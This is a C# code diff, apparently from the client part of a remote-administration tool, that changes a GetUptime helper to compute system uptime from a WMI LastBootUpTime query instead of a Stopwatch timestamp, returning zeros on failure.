@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Management;
 
 namespace xClient.Core.Helper
@@ -8,10 +7,31 @@ namespace xClient.Core.Helper
     {
         public static string GetUptime()
         {
-            long ticks = Stopwatch.GetTimestamp();
-            double uptime = ((double)ticks) / Stopwatch.Frequency;
-            var uptimeSpan = TimeSpan.FromSeconds(uptime);
-            return string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
+            try
+            {
+                string uptime = string.Empty;
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
+                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);
+
+                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
+                        break;
+                    }
+                }
+
+                if (string.IsNullOrEmpty(uptime))
+                    throw new Exception("Getting uptime failed");
+
+                return uptime;
+            }
+            catch (Exception)
+            {
+                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
+            }
         }
 
         public static string GetPcName()
